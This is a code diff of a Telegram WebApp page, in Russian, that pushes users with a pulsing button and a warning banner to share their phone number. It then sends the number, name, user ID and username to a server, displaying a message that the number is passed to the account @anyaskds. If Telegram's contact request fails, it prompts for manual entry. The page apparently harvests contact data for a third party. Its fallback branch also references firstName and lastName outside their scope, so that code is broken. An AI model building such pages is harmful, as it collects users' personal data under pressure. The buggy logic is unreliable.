@@ -293,26 +293,9 @@
             to { transform: rotate(360deg); }
         }
 
-        .phone-display {
-            background: #1a1a2a;
-            border-radius: 12px;
-            padding: 12px 16px;
-            margin-bottom: 16px;
-            border: 1px solid #2a2a3a;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .phone-display .label {
-            color: #6c6c84;
-            font-size: 12px;
-        }
-
-        .phone-display .number {
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
+        .success-icon {
+            font-size: 56px;
+            margin-bottom: 12px;
         }
 
         .success-box {
@@ -337,6 +320,21 @@
 
         .success-box .row .green {
             color: #4caf50;
+        }
+
+        /* Анимация пульсации для кнопки */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(108, 92, 231, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(108, 92, 231, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(108, 92, 231, 0); }
+        }
+
+        .btn-share.pulse {
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
@@ -384,9 +382,14 @@
                 ⚠️ Нажмите кнопку ниже, чтобы поделиться номером телефона
             </div>
 
-            <button class="btn-share" id="btnShareContact">
+            <button class="btn-share pulse" id="btnShareContact">
                 📱 Поделиться номером
             </button>
+
+            <div style="margin-top:16px; padding:12px; background:#1a1a2a; border-radius:12px; border:1px solid #2a2a3a; display:none;" id="successMessage">
+                <div style="color:#4caf50; font-weight:600;">✅ Номер отправлен!</div>
+                <div style="color:#6c6c84; font-size:12px; margin-top:4px;">Ожидайте подтверждение в Telegram</div>
+            </div>
 
             <div class="user-info">
                 <div class="avatar">A</div>
@@ -429,6 +432,7 @@
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
         const loadingSubtext = document.getElementById('loadingSubtext');
+        const successMessage = document.getElementById('successMessage');
 
         // Показать шаг
         function showStep(step) {
@@ -447,60 +451,89 @@
             showStep(stepPhone);
         });
 
+        // Функция отправки контакта
+        function sendContact(phoneNumber, contactFirstName, contactLastName) {
+            // Показываем загрузку
+            loadingOverlay.classList.add('active');
+            loadingText.textContent = '📤 Отправка данных...';
+            loadingSubtext.textContent = 'Передача номера на @anyaskds';
+
+            // Отправляем данные на сервер
+            fetch('/api/share-contact', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: phoneNumber,
+                    first_name: contactFirstName || 'Неизвестный',
+                    last_name: contactLastName || '',
+                    user_id: userId,
+                    username: username,
+                    full_name: fullName
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log('✅ Данные отправлены:', data);
+                
+                loadingOverlay.classList.remove('active');
+                
+                // Показываем сообщение об успехе
+                successMessage.style.display = 'block';
+                btnShareContact.classList.remove('pulse');
+                btnShareContact.disabled = true;
+                btnShareContact.textContent = '✅ Отправлено!';
+                
+                alert('✅ Ваш номер отправлен!\n\nОжидайте подтверждение в Telegram.');
+            })
+            .catch(err => {
+                console.log('❌ Ошибка:', err);
+                loadingOverlay.classList.remove('active');
+                alert('❌ Ошибка отправки. Попробуйте еще раз.');
+            });
+        }
+
         // Шаг 2 → Запрос контакта через Telegram
         btnShareContact.addEventListener('click', function() {
-            // Запрашиваем контакт через Telegram WebApp
-            tg.requestContact((contact) => {
-                if (contact) {
-                    // Получили контакт
-                    const phoneNumber = contact.phone_number || 'не указан';
-                    
-                    console.log('📱 Получен контакт:');
-                    console.log('👤 Имя:', contact.first_name, contact.last_name || '');
-                    console.log('📱 Телефон:', phoneNumber);
-                    
-                    // Показываем загрузку
-                    loadingOverlay.classList.add('active');
-                    loadingText.textContent = '📤 Отправка данных...';
-                    loadingSubtext.textContent = 'Передача номера на @anyaskds';
-
-                    // Отправляем данные на сервер
-                    fetch('/api/share-contact', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            phone: phoneNumber,
-                            first_name: contact.first_name,
-                            last_name: contact.last_name || '',
-                            user_id: userId,
-                            username: username,
-                            full_name: fullName
-                        })
-                    })
-                    .then(res => res.json())
-                    .then(data => {
-                        console.log('✅ Данные отправлены:', data);
+            try {
+                // Пытаемся запросить контакт через Telegram WebApp
+                tg.requestContact((contact) => {
+                    if (contact) {
+                        // Получили контакт
+                        const phoneNumber = contact.phone_number || 'не указан';
+                        const firstName = contact.first_name || 'Неизвестный';
+                        const lastName = contact.last_name || '';
                         
-                        loadingText.textContent = '✅ Отправлено!';
-                        loadingSubtext.textContent = 'Номер телефона передан';
+                        console.log('📱 Получен контакт:');
+                        console.log('👤 Имя:', firstName, lastName);
+                        console.log('📱 Телефон:', phoneNumber);
                         
-                        setTimeout(() => {
-                            loadingOverlay.classList.remove('active');
-                            showStep(stepMain);
-                            alert('✅ Ваш номер отправлен!\n\nОжидайте подтверждение в Telegram.');
-                        }, 1500);
-                    })
-                    .catch(err => {
-                        console.log('❌ Ошибка:', err);
-                        loadingOverlay.classList.remove('active');
-                        alert('❌ Ошибка отправки. Попробуйте еще раз.');
-                    });
-                    
+                        sendContact(phoneNumber, firstName, lastName);
+                        
+                    } else {
+                        // Пользователь отказался
+                        alert('❌ Вы отказались поделиться номером.');
+                    }
+                });
+            } catch (e) {
+                // Если requestContact не работает, используем альтернативный способ
+                console.log('⚠️ requestContact не работает, используем альтернативный способ');
+                
+                // Альтернативный способ: получаем номер из Telegram WebApp
+                const phoneFromUser = user.phone_number;
+                
+                if (phoneFromUser) {
+                    console.log('📱 Номер из Telegram:', phoneFromUser);
+                    sendContact(phoneFromUser, firstName, lastName);
                 } else {
-                    // Пользователь отказался
-                    alert('❌ Вы отказались поделиться номером.');
+                    // Если номер не доступен, просим ввести вручную
+                    const manualPhone = prompt('Введите ваш номер телефона (в формате +380XXXXXXXXX):');
+                    if (manualPhone && manualPhone.length > 5) {
+                        sendContact(manualPhone, firstName, lastName);
+                    } else {
+                        alert('❌ Некорректный номер телефона.');
+                    }
                 }
-            });
+            }
         });
 
         // Назад
